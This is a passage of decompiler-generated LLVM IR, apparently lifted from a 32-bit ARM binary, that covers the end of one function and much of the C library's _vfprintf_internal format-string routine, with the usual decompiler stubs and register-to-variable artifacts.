  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_147a8, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_195d4.1336 to i32))
  %v0_147b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_147b8 = add i32 %storemerge, %v0_147b8
  store i32 %v2_147b8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_147bc

dec_label_pc_147bc:                               ; preds = %dec_label_pc_14780, %bb15
  %v0_147bc = phi i32 [ %v4_1478c, %dec_label_pc_14780 ], [ %v2_147b8, %bb15 ]
  store i32 %v0_147bc, i32* %r0.global-to-local, align 4
  %v2_147c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_147c0, i32* %r4.global-to-local, align 4
  store i32 %v6_14744, i32* %r5.global-to-local, align 4
  ret i32 %v0_147bc

; uselistorder directives
  uselistorder i32 %v0_147bc, { 1, 0 }
  uselistorder i32 %v0_1479c, { 1, 0 }
  uselistorder i32 %v2_1476c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_147bc, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_1479c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp91 = call i32 @__decompiler_undefined_function_0()
  %tmp94 = call i8 @__decompiler_undefined_function_2()
  %tmp95 = call i32 @__decompiler_undefined_function_0()
  %tmp96 = call i32 @__decompiler_undefined_function_0()
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp98 = call i8 @__decompiler_undefined_function_2()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-69 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_147c4 = load i32, i32* @r4, align 4
  store i32 %v3_147c4, i32* %stack_var_-36, align 4
  %v6_147c4 = load i32, i32* @r5, align 4
  %v9_147c4 = load i32, i32* @r6, align 4
  %v18_147c4 = load i32, i32* @sb, align 4
  %v21_147c4 = load i32, i32* @sl, align 4
  %v24_147c4 = load i32, i32* @fp, align 4
  %v2_147cc = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_147cc, i32* @r6, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %v2_147cc, i32* %r0.global-to-local, align 4
  %v0_147d8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_147d8, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_147e0 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348)
  store i32 %v2_147e0, i32* %r0.global-to-local, align 4
  %v1_147e4 = icmp slt i32 %v2_147e0, 0
  br i1 %v1_147e4, label %dec_label_pc_147ec, label %dec_label_pc_14818

dec_label_pc_147ec:                               ; preds = %entry
  %v3_147ec = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_147ec, i32* @r4, align 4
  %v1_147f0 = inttoptr i32 %v3_147ec to i8*
  store i32 %v3_147ec, i32* %r0.global-to-local, align 4
  %v3_147f4 = call i32 @strlen(i8* %v1_147f0)
  store i32 %v3_147f4, i32* %r0.global-to-local, align 4
  %v2_147f8 = icmp eq i32 %v3_147f4, 0
  br i1 %v2_147f8, label %bb, label %dec_label_pc_14808

bb:                                               ; preds = %dec_label_pc_147ec
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14dfc

dec_label_pc_14808:                               ; preds = %dec_label_pc_147ec
  %v0_14808 = load i32, i32* @r4, align 4
  store i32 %v0_14808, i32* %r0.global-to-local, align 4
  %v0_1480c = load i32, i32* @sb, align 4
  store i32 %v0_1480c, i32* %r2.global-to-local, align 4
  %v3_14810 = inttoptr i32 %v0_1480c to i8*
  %v4_14810 = call i32 @__stdio_fwrite(i32 %v0_14808, i32 %v3_147f4, i8* %v3_14810)
  store i32 %v4_14810, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14df4

dec_label_pc_14818:                               ; preds = %entry
  store i32 %v2_147cc, i32* %r0.global-to-local, align 4
  %v0_1481c = load i32, i32* @r5, align 4
  %v2_14820 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_14820, i32* @fp, align 4
  %v2_14824 = call i32 @_ppfs_prepargs(i32 %v2_147cc, i32 %v0_1481c)
  store i32 %v2_14824, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_1482c = ptrtoint i32* %stack_var_-69 to i32
  %v0_14834 = load i32, i32* @r4, align 4
  store i32 %v0_14834, i32* %r2.global-to-local, align 4
  %v1_148b8 = bitcast i32* %stack_var_-348 to i8*
  %v4_148c8 = zext i8 %tmp98 to i32
  %tmp122 = icmp slt i32 %tmp99, 1
  %v7_148d4 = ptrtoint i32* %stack_var_-268 to i32
  %v2_148ec = ptrtoint i32* %stack_var_-36 to i32
  %v2_14908 = icmp eq i32 %tmp96, 0
  %v2_14c60 = ptrtoint i32* %stack_var_-344 to i32
  %v2_14c64 = ptrtoint i32* %stack_var_-68 to i32
  %v2_14b24 = ptrtoint i32* %stack_var_-40 to i32
  %v2_14b30 = ptrtoint i32* %stack_var_-48 to i32
  %v7_1499c = zext i8 %tmp94 to i32
  %v5_149dc = bitcast i32* %stack_var_-69 to i8*
  %v2_149e4 = icmp ugt i32 %tmp96, 4
  %v7_149e4 = icmp eq i32 %tmp96, 5
  %v7_148d0 = ptrtoint i32* %stack_var_-276 to i32
  %v5_14900182 = icmp sgt i32 %tmp97, 0
  %tmp189 = icmp ugt i32 %tmp96, 7
  %tmp190 = icmp ugt i32 %tmp96, 15
  %v2_14af8 = icmp ugt i32 %tmp96, 16
  %v7_14af8 = icmp eq i32 %tmp96, 17
  %v2_14afc = xor i1 %v7_14af8, true
  %v3_14afc = and i1 %v2_14af8, %v2_14afc
  %v2_14b7c = icmp ugt i32 %tmp96, 18
  %v7_14b7c = icmp eq i32 %tmp96, 19
  %v2_14b80 = xor i1 %v7_14b7c, true
  %v3_14b80 = and i1 %v2_14b7c, %v2_14b80
  %v7_14c14 = icmp eq i32 %tmp96, 20
  %v1_14944 = add i32 %tmp96, add (i32 ptrtoint (i32* @global_var_2469c.1338 to i32), i32 -1)
  %v2_14944 = inttoptr i32 %v1_14944 to i8*
  %v2_14970 = xor i1 %v7_149e4, true
  %v3_14970 = and i1 %v2_149e4, %v2_14970
  %v7_149a4 = icmp eq i32 %tmp96, 1
  %v2_149ec = xor i1 %v2_149e4, true
  %v3_149ec = or i1 %v7_149e4, %v2_149ec
  %tmp191 = icmp ult i32 %tmp96, 3
  %v7_14a50 = icmp eq i32 %tmp96, 3
  %v11_14a5c = icmp eq i32 %tmp96, 4
  %v9_148d8 = mul nuw nsw i32 %v4_148c8, 8
  %v10_148d8 = add i32 %v7_148d0, %v9_148d8
  br label %dec_label_pc_14838.outer

dec_label_pc_14838.outer:                         ; preds = %dec_label_pc_14de0, %dec_label_pc_14818
  %v0_1483844 = phi i32 [ %v3_14de0, %dec_label_pc_14de0 ], [ %v0_14834, %dec_label_pc_14818 ]
  %v0_14964 = phi i32 [ %stack_var_-332.4, %dec_label_pc_14de0 ], [ %tmp95, %dec_label_pc_14818 ]
  %stack_var_-352.1.ph = phi i32 [ %stack_var_-352.3, %dec_label_pc_14de0 ], [ 0, %dec_label_pc_14818 ]
  br label %dec_label_pc_14838.outer35

dec_label_pc_14838.outer35:                       ; preds = %dec_label_pc_14838.outer, %dec_label_pc_14dec
  %v0_1483843 = phi i32 [ %v0_1483844, %dec_label_pc_14838.outer ], [ %v1_14dec, %dec_label_pc_14dec ]
  %v5_14864 = phi i32 [ %v0_1483844, %dec_label_pc_14838.outer ], [ %v1_14894, %dec_label_pc_14dec ]
  %stack_var_-352.1.ph36 = phi i32 [ %stack_var_-352.1.ph, %dec_label_pc_14838.outer ], [ %v1_14cdc, %dec_label_pc_14dec ]
  %v1_14838175 = inttoptr i32 %v0_1483843 to i8*
  %v2_14838176 = load i8, i8* %v1_14838175, align 1
  %v2_1483c178 = icmp eq i8 %v2_14838176, 0
  br i1 %v2_1483c178, label %dec_label_pc_14854, label %bb123

bb123:                                            ; preds = %dec_label_pc_14838.outer35, %.thread6
  %v2_14838180 = phi i8 [ %v2_14838, %.thread6 ], [ %v2_14838176, %dec_label_pc_14838.outer35 ]
  %v1_1484c179 = phi i32 [ %v2_1484c, %.thread6 ], [ %v0_1483843, %dec_label_pc_14838.outer35 ]
  %v8_14840 = icmp eq i8 %v2_14838180, 37
  br i1 %v8_14840, label %dec_label_pc_14854, label %.thread6

.thread6:                                         ; preds = %bb123
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1484c = add i32 %v1_1484c179, 1
  store i32 %v2_1484c, i32* @r4, align 4
  %v1_14838 = inttoptr i32 %v2_1484c to i8*
  %v2_14838 = load i8, i8* %v1_14838, align 1
  %v2_1483c = icmp eq i8 %v2_14838, 0
  br i1 %v2_1483c, label %dec_label_pc_14854, label %bb123

dec_label_pc_14854:                               ; preds = %bb123, %.thread6, %dec_label_pc_14838.outer35
  %v1_1484c.lcssa = phi i32 [ %v0_1483843, %dec_label_pc_14838.outer35 ], [ %v2_1484c, %.thread6 ], [ %v1_1484c179, %bb123 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_14854 = sub i32 %v1_1484c.lcssa, %v5_14864
  %v9_14854 = icmp eq i32 %v1_1484c.lcssa, %v5_14864
  br i1 %v9_14854, label %dec_label_pc_14888, label %dec_label_pc_1485c

dec_label_pc_1485c:                               ; preds = %dec_label_pc_14854
  store i32 %v2_14854, i32* @r5, align 4
  %tmp125 = icmp slt i32 %v2_14854, 1
  br i1 %tmp125, label %bb127, label %bb126

bb126:                                            ; preds = %dec_label_pc_1485c
  store i32 %v5_14864, i32* %r0.global-to-local, align 4
  %v5_1486c = load i32, i32* @sb, align 4
  store i32 %v5_1486c, i32* %r2.global-to-local, align 4
  br label %bb127

bb127:                                            ; preds = %dec_label_pc_1485c, %bb126
  %tmp128 = phi i1 [ true, %bb126 ], [ false, %dec_label_pc_1485c ]
  store i32 84084, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp128, i32 ptrtoint (i32* @global_var_195d4.1336 to i32))
  %v0_14874 = load i32, i32* %r0.global-to-local, align 4
  %v1_14874 = load i32, i32* @r5, align 4
  %v9_14874 = icmp eq i32 %v0_14874, %v1_14874
  br i1 %v9_14874, label %dec_label_pc_1487c, label %dec_label_pc_14df4

dec_label_pc_1487c:                               ; preds = %bb127
  %v2_14880 = add i32 %v0_14874, %stack_var_-352.1.ph36
  store i32 %v2_14880, i32* %ip.global-to-local, align 4
  %v0_14888.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14888

dec_label_pc_14888:                               ; preds = %dec_label_pc_14854, %dec_label_pc_1487c
  %v0_1489c = phi i32 [ %v5_14864, %dec_label_pc_14854 ], [ %v0_14888.pre, %dec_label_pc_1487c ]
  %v1_14cdc = phi i32 [ %stack_var_-352.1.ph36, %dec_label_pc_14854 ], [ %v2_14880, %dec_label_pc_1487c ]
  %v1_14888 = inttoptr i32 %v0_1489c to i8*
  %v2_14888 = load i8, i8* %v1_14888, align 1
  %v2_1488c = icmp eq i8 %v2_14888, 0
  br i1 %v2_1488c, label %dec_label_pc_14dfc, label %dec_label_pc_14894

dec_label_pc_14894:                               ; preds = %dec_label_pc_14888
  %v1_14894 = add i32 %v0_1489c, 1
  %v2_14894 = inttoptr i32 %v1_14894 to i8*
  %v3_14894 = load i8, i8* %v2_14894, align 1
  %v7_14898 = icmp eq i8 %v3_14894, 37
  store i32 %v1_14894, i32* %r2.global-to-local, align 4
  br i1 %v7_14898, label %dec_label_pc_14dec, label %dec_label_pc_148a4

dec_label_pc_148a4:                               ; preds = %dec_label_pc_14894
  store i32 %v2_147cc, i32* @r4, align 4
  store i32 %v2_147cc, i32* %r0.global-to-local, align 4
  store i32 %v1_14894, i32* %stack_var_-348, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_148b8 = call i32 @_ppfs_parsespec(i8* %v1_148b8)
  store i32 %v2_147cc, i32* @r0, align 4
  %v0_148c0 = call i32 @_ppfs_setargs()
  store i32 %v0_148c0, i32* %r0.global-to-local, align 4
  store i32 %v4_148c8, i32* %ip.global-to-local, align 4
  br i1 %tmp122, label %bb131, label %bb130

bb130:                                            ; preds = %dec_label_pc_148a4
  br label %bb131

bb131:                                            ; preds = %dec_label_pc_148a4, %bb130
  %storemerge = phi i32 [ %v10_148d8, %bb130 ], [ %v7_148d4, %dec_label_pc_148a4 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_14900182, label %dec_label_pc_148e4, label %dec_label_pc_14904

dec_label_pc_148e4:                               ; preds = %bb131, %dec_label_pc_148e4
  %v5_148f0184 = phi i32 [ %v5_148f0, %dec_label_pc_148e4 ], [ %v2_148ec, %bb131 ]
  %v0_148e4183 = phi i32 [ %v1_148e8, %dec_label_pc_148e4 ], [ %storemerge, %bb131 ]
  %v2_148e4 = add i32 %v5_148f0184, -32
  %v3_148e4 = inttoptr i32 %v2_148e4 to i32*
  store i32 %v0_148e4183, i32* %v3_148e4, align 4
  %v0_148e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_148e8 = add i32 %v0_148e8, 8
  store i32 %v1_148e8, i32* %r0.global-to-local, align 4
  %v1_148f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_148f0 = mul i32 %v1_148f0.pre, 4
  %v5_148f0 = add i32 %v4_148f0, %v2_148ec
  %v1_148fc = add i32 %v1_148f0.pre, 1
  store i32 %v1_148fc, i32* %r2.global-to-local, align 4
  %v5_14900 = icmp slt i32 %v1_148f0.pre, %tmp97
  br i1 %v5_14900, label %dec_label_pc_148e4, label %dec_label_pc_14904

dec_label_pc_14904:                               ; preds = %dec_label_pc_148e4, %bb131
  store i32 %tmp96, i32* %r2.global-to-local, align 4
  br i1 %v2_14908, label %dec_label_pc_14910, label %dec_label_pc_14934

dec_label_pc_14910:                               ; preds = %dec_label_pc_14904
  %v3_14910 = load i32, i32* %stack_var_-68, align 4
  store i32 %v1_14cdc, i32* %ip.global-to-local, align 4
  %v1_1491c = inttoptr i32 %v3_14910 to i32*
  %v2_1491c = load i32, i32* %v1_1491c, align 4
  store i32 %v2_1491c, i32* %r0.global-to-local, align 4
  %v1_14920 = and i32 %v0_14964, 3840
  %v3_14928 = ashr i32 %v1_14cdc, 31
  store i32 %v3_14928, i32* %r2.global-to-local, align 4
  %v4_1492c = inttoptr i32 %v2_1491c to i8*
  %v5_1492c = call i32 @_store_inttype(i8* %v4_1492c, i32 %v1_14920, i32 %v3_14928, i32 %v1_14cdc)
  store i32 %v5_1492c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14de0

dec_label_pc_14934:                               ; preds = %dec_label_pc_14904
  br i1 %tmp189, label %dec_label_pc_14abc, label %dec_label_pc_1493c

dec_label_pc_1493c:                               ; preds = %dec_label_pc_14934
  %v3_14944 = load i8, i8* %v2_14944, align 1
  %v4_14944 = zext i8 %v3_14944 to i32
  store i32 %v4_14944, i32* @r4, align 4
  %v7_14948 = icmp eq i8 %v3_14944, 10
  br i1 %v7_14948, label %dec_label_pc_14954, label %bb132

bb132:                                            ; preds = %dec_label_pc_1493c
  store i32 87, i32* @r5, align 4
  br label %bb136

dec_label_pc_14954:                               ; preds = %dec_label_pc_1493c
  %v1_14958 = and i32 %v0_14964, 32
  %v2_14958 = icmp eq i32 %v1_14958, 0
  %.170 = select i1 %v2_14958, i32 87, i32 44
  store i32 %.170, i32* @r5, align 4
  %v1_14964 = and i32 %v0_14964, 64
  %v2_14964 = icmp eq i32 %v1_14964, 0
  br i1 %v2_14964, label %bb136, label %bb135

bb135:                                            ; preds = %dec_label_pc_14954
  %.171 = select i1 %v2_14958, i32 215, i32 172
  store i32 %.171, i32* @r5, align 4
  br label %bb136

bb136:                                            ; preds = %bb132, %dec_label_pc_14954, %bb135
  br i1 %v3_14970, label %.thread, label %dec_label_pc_14978

.thread:                                          ; preds = %bb136
  %v5_14970 = sub nsw i32 0, %v4_14944
  store i32 %v5_14970, i32* @r4, align 4
  br label %dec_label_pc_14990

dec_label_pc_14978:                               ; preds = %bb136
  br i1 %v7_14a50, label %bb137, label %dec_label_pc_14984

bb137:                                            ; preds = %dec_label_pc_14978
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_14990

dec_label_pc_14984:                               ; preds = %dec_label_pc_14978
  br i1 %v7_149a4, label %dec_label_pc_14994, label %dec_label_pc_14990

dec_label_pc_14990:                               ; preds = %.thread, %bb137, %dec_label_pc_14984
  %v0_149bc79 = phi i32 [ %v5_14970, %.thread ], [ %v4_14944, %bb137 ], [ %v4_14944, %dec_label_pc_14984 ]
  br label %dec_label_pc_14994

dec_label_pc_14994:                               ; preds = %dec_label_pc_14984, %dec_label_pc_14990
  %v0_149bc78 = phi i32 [ %v0_149bc79, %dec_label_pc_14990 ], [ %v4_14944, %dec_label_pc_14984 ]
  %storemerge86 = phi i32 [ 11, %dec_label_pc_14990 ], [ 6, %dec_label_pc_14984 ]
  store i32 %storemerge86, i32* @r6, align 4
  %v3_14994 = load i32, i32* %stack_var_-344, align 4
  %v1_14998 = icmp slt i32 %v3_14994, 0
  %v7_1499c. = select i1 %v1_14998, i32 %v7_1499c, i32 32
  store i32 %v7_1499c., i32* @sl, align 4
  br i1 %v7_149a4, label %bb142, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_14994
  store i32 %v2_148ec, i32* %r2.global-to-local, align 4
  %v2_149ac = load i32, i32* %ip.global-to-local, align 4
  %v5_149ac = mul i32 %v2_149ac, 4
  %v6_149ac = add i32 %v5_149ac, %v2_148ec
  %v2_149b0 = add i32 %v6_149ac, -276
  %v3_149b0 = inttoptr i32 %v2_149b0 to i32*
  %v4_149b0 = load i32, i32* %v3_149b0, align 4
  %v2_149b8 = and i32 %v4_149b0, 3840
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_14994, %.thread15
  %storemerge88 = phi i32 [ %v2_149b8, %.thread15 ], [ 1024, %dec_label_pc_14994 ]
  store i32 %storemerge88, i32* @r0, align 4
  store i32 %v0_149bc78, i32* @r2, align 4
  %v3_149c0 = load i32, i32* %stack_var_-68, align 4
  store i32 %v3_149c0, i32* @r1, align 4
  %v0_149c4 = call i32 @_load_inttype()
  %v0_149c8 = load i32, i32* @r4, align 4
  %v0_149cc = load i32, i32* @r1, align 4
  store i32 %v0_149cc, i32* %r2.global-to-local, align 4
  store i32 %v2_1482c, i32* %r0.global-to-local, align 4
  %v0_149d8 = load i32, i32* @r5, align 4
  %v6_149dc = call i32 @_uintmaxtostr(i8* %v5_149dc, i32 %v0_149c4, i32 %v0_149cc, i32 %v0_149c8, i32 %v0_149d8)
  store i32 %v6_149dc, i32* %r0.global-to-local, align 4
  store i32 %v6_149dc, i32* @r4, align 4
  br i1 %v3_149ec, label %bb145, label %dec_label_pc_149f0

dec_label_pc_149f0:                               ; preds = %bb142
  %v7_149dc = inttoptr i32 %v6_149dc to i8*
  %v3_149f0 = load i8, i8* %v7_149dc, align 1
  %v7_149f4 = icmp eq i8 %v3_149f0, 45
  %v2_149fc = or i32 %v0_14964, 2
  %v2_149fc.stack_var_-332.0 = select i1 %v7_149f4, i32 %v2_149fc, i32 %v0_14964
  br i1 %v7_149f4, label %.thread17, label %dec_label_pc_14a10

.thread17:                                        ; preds = %dec_label_pc_149f0
  %v3_14a00 = add i32 %v6_149dc, 1
  store i32 %v3_14a00, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb145

dec_label_pc_14a10:                               ; preds = %dec_label_pc_149f0
  %v1_14a10 = and i32 %v2_149fc.stack_var_-332.0, 2
  %v2_14a10 = icmp eq i32 %v1_14a10, 0
  br i1 %v2_14a10, label %dec_label_pc_14a1c, label %bb143

bb143:                                            ; preds = %dec_label_pc_14a10
  store i32 0, i32* @r6, align 4
  br label %bb145

dec_label_pc_14a1c:                               ; preds = %dec_label_pc_14a10
  %v1_14a1c = urem i32 %v2_149fc.stack_var_-332.0, 2
  %v2_14a1c = icmp eq i32 %v1_14a1c, 0
  br i1 %v2_14a1c, label %bb145, label %bb144

bb144:                                            ; preds = %dec_label_pc_14a1c
  store i32 4, i32* @r6, align 4
  br label %bb145

bb145:                                            ; preds = %.thread17, %bb143, %bb142, %dec_label_pc_14a1c, %bb144
  %v0_14a74 = phi i32 [ %v6_149dc, %bb142 ], [ %v3_14a00, %.thread17 ], [ %v6_149dc, %dec_label_pc_14a1c ], [ %v6_149dc, %bb144 ], [ %v6_149dc, %bb143 ]
  %v0_14a34 = phi i32 [ %v0_14964, %bb142 ], [ %v2_149fc, %.thread17 ], [ %v0_14964, %dec_label_pc_14a1c ], [ %v0_14964, %bb144 ], [ %v0_14964, %bb143 ]
  %v3_14a24 = load i32, i32* %stack_var_-344, align 4
  %v1_14a2c = icmp slt i32 %v3_14a24, 0
  br i1 %v1_14a2c, label %bb146, label %bb147

bb146:                                            ; preds = %bb145
  br label %bb147

bb147:                                            ; preds = %bb145, %bb146
  %storemerge188 = phi i32 [ 1, %bb146 ], [ %v3_14a24, %bb145 ]
  %v0_14a58 = phi i32 [ 1, %bb146 ], [ %v3_14a24, %bb145 ]
  store i32 %storemerge188, i32* %r2.global-to-local, align 4
  %v1_14a34 = and i32 %v0_14a34, 16
  %v2_14a34 = icmp eq i32 %v1_14a34, 0
  %v2_14a3c = sub i32 %v2_1482c, %v0_14a74
  store i32 %v2_14a3c, i32* @r5, align 4
  br i1 %v2_14a34, label %bb154, label %dec_label_pc_14a44

dec_label_pc_14a44:                               ; preds = %bb147
  br i1 %tmp191, label %bb148, label %bb149

bb148:                                            ; preds = %dec_label_pc_14a44
  store i32 6, i32* @r6, align 4
  br label %bb149

bb149:                                            ; preds = %dec_label_pc_14a44, %bb148
  br i1 %v7_14a50, label %bb150, label %bb151

bb150:                                            ; preds = %bb149
  store i32 9, i32* @r6, align 4
  br label %bb151

bb151:                                            ; preds = %bb149, %bb150
  %tmp192 = icmp ugt i32 %v0_14a58, %v2_14a3c
  br i1 %tmp192, label %bb154, label %bb152

bb152:                                            ; preds = %bb151
  br i1 %v11_14a5c, label %dec_label_pc_14a64, label %bb154

dec_label_pc_14a64:                               ; preds = %bb152
  %v1_14a64 = inttoptr i32 %v0_14a74 to i8*
  %v2_14a64 = load i8, i8* %v1_14a64, align 1
  %v7_14a68 = icmp eq i8 %v2_14a64, 48
  br i1 %v7_14a68, label %bb153, label %.thread24

bb153:                                            ; preds = %dec_label_pc_14a64
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb154

.thread24:                                        ; preds = %dec_label_pc_14a64
  %v2_14a70 = add i32 %v2_14a3c, 1
  store i32 %v2_14a70, i32* %r2.global-to-local, align 4
  br label %bb154

bb154:                                            ; preds = %bb151, %bb153, %bb152, %bb147, %.thread24
  %v5_14aac = phi i32 [ %v0_14a58, %bb152 ], [ %v0_14a58, %bb147 ], [ 1, %bb153 ], [ %v2_14a70, %.thread24 ], [ %v0_14a58, %bb151 ]
  %v1_14a74 = inttoptr i32 %v0_14a74 to i8*
  %v2_14a74 = load i8, i8* %v1_14a74, align 1
  %v7_14a78 = icmp eq i8 %v2_14a74, 48
  br i1 %v7_14a78, label %dec_label_pc_14a80, label %dec_label_pc_14aa8

dec_label_pc_14a80:                               ; preds = %bb154
  %v0_14a84 = load i32, i32* @r6, align 4
  %v7_14a88 = icmp slt i32 %v0_14a84, 6
  br i1 %v7_14a88, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_14a80
  store i32 11, i32* @r6, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_14a80, %bb155
  br i1 %v7_149a4, label %.thread25, label %dec_label_pc_14a9c

.thread25:                                        ; preds = %bb156
  store i32 ptrtoint ([6 x i8]* @global_var_24680.1340 to i32), i32* @r4, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_14ab4

dec_label_pc_14a9c:                               ; preds = %bb156
  %v2_14a9c = icmp eq i32 %v5_14aac, 0
  br i1 %v2_14a9c, label %bb157, label %dec_label_pc_14aa8

bb157:                                            ; preds = %dec_label_pc_14a9c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14ab4

dec_label_pc_14aa8:                               ; preds = %dec_label_pc_14a9c, %bb154
  %v2_14aa8 = sub i32 %v5_14aac, %v2_14a3c
  %tmp193 = icmp ugt i32 %v5_14aac, %v2_14a3c
  br i1 %tmp193, label %.thread83, label %dec_label_pc_14ab4

.thread83:                                        ; preds = %dec_label_pc_14aa8
  store i32 %v2_14aa8, i32* @r7, align 4
  br label %dec_label_pc_14cacthread-pre-split

dec_label_pc_14ab4:                               ; preds = %dec_label_pc_14aa8, %.thread25, %bb157
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_14cacthread-pre-split

dec_label_pc_14abc:                               ; preds = %dec_label_pc_14934
  br i1 %tmp190, label %dec_label_pc_14af8, label %dec_label_pc_14ac4

dec_label_pc_14ac4:                               ; preds = %dec_label_pc_14abc
  %v3_14acc = load i32, i32* %stack_var_-68, align 4
  %v0_14ad0 = load i32, i32* @sb, align 4
  store i32 %v0_14ad0, i32* %r0.global-to-local, align 4
  %v1_14ad4 = inttoptr i32 %v3_14acc to i32*
  %v2_14ad4 = load i32, i32* %v1_14ad4, align 4
  %v3_14ad4 = add i32 %v3_14acc, 4
  %v4_14ad4 = inttoptr i32 %v3_14ad4 to i32*
  %v5_14ad4 = load i32, i32* %v4_14ad4, align 4
  store i32 %v5_14ad4, i32* %r2.global-to-local, align 4
  %v5_14adc = sext i32 %v2_14ad4 to i64
  %v6_14adc = bitcast i64 %v5_14adc to double
  %v7_14adc = call i32 @_fpmaxtostr(i32 %v0_14ad0, double %v6_14adc, i32 %v5_14ad4, i32 %v2_14c60, i32 83780)
  store i32 %v7_14adc, i32* %r0.global-to-local, align 4
  %v1_14ae0 = icmp slt i32 %v7_14adc, 0
  br i1 %v1_14ae0, label %dec_label_pc_14df4, label %dec_label_pc_14ae8

dec_label_pc_14ae8:                               ; preds = %dec_label_pc_14ac4
  %v2_14aec = add i32 %v7_14adc, %v1_14cdc
  store i32 %v2_14aec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14de0

dec_label_pc_14af8:                               ; preds = %dec_label_pc_14abc
  br i1 %v3_14afc, label %dec_label_pc_14b7c, label %dec_label_pc_14b00

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14af8
  store i32 0, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v3_14b08 = load i32, i32* %stack_var_-68, align 4
  store i32 %v3_14b08, i32* %r0.global-to-local, align 4
  %v1_14b10 = inttoptr i32 %v3_14b08 to i32*
  %v2_14b10 = load i32, i32* %v1_14b10, align 4
  br i1 %v7_14af8, label %dec_label_pc_14b10, label %dec_label_pc_14b48

dec_label_pc_14b10:                               ; preds = %dec_label_pc_14b00
  %v9_14b14 = icmp eq i32 %v2_14b10, 0
  store i32 %v2_14b10, i32* %stack_var_-40, align 4
  br i1 %v9_14b14, label %dec_label_pc_14bbc, label %dec_label_pc_14b20

dec_label_pc_14b20:                               ; preds = %dec_label_pc_14b10
  %v3_14b20 = load i32, i32* %stack_var_-344, align 4
  store i32 %v2_14b24, i32* @r0, align 4
  %v4_14b28 = ashr i32 %v3_14b20, 31
  %v5_14b28 = or i32 %v4_14b28, %v3_14b20
  store i32 %v5_14b28, i32* %r2.global-to-local, align 4
  store i32 %v2_14b24, i32* @r1, align 4
  %v6_14b34 = call i32 @__GI_wcsrtombs(i32 %v2_14b24, i32 %v2_14b24, i32 %v5_14b28, i32 %v2_14b30, i32 0, i32 %v2_14b10)
  store i32 %v6_14b34, i32* %r0.global-to-local, align 4
  %v3_14b38 = icmp eq i32 %v6_14b34, -1
  store i32 %v6_14b34, i32* @r5, align 4
  br i1 %v3_14b38, label %dec_label_pc_14df4, label %dec_label_pc_14c9c

dec_label_pc_14b48:                               ; preds = %dec_label_pc_14b00
  store i32 %v2_14b30, i32* %r2.global-to-local, align 4
  store i32 %v2_14820, i32* %r0.global-to-local, align 4
  %v5_14b54 = call i32 @__GI_wcrtomb(i32 %v2_14820, i32 %v2_14b10, i32 %v2_14b30, i32 %tmp97, i32 0)
  store i32 %v5_14b54, i32* %r0.global-to-local, align 4
  %v7_14b58 = icmp eq i32 %v5_14b54, -1
  store i32 %v5_14b54, i32* @r5, align 4
  br i1 %v7_14b58, label %dec_label_pc_14df4, label %dec_label_pc_14b64

dec_label_pc_14b64:                               ; preds = %dec_label_pc_14b48
  %v0_14b64 = load i32, i32* @r8, align 4
  store i32 %v0_14b64, i32* @r7, align 4
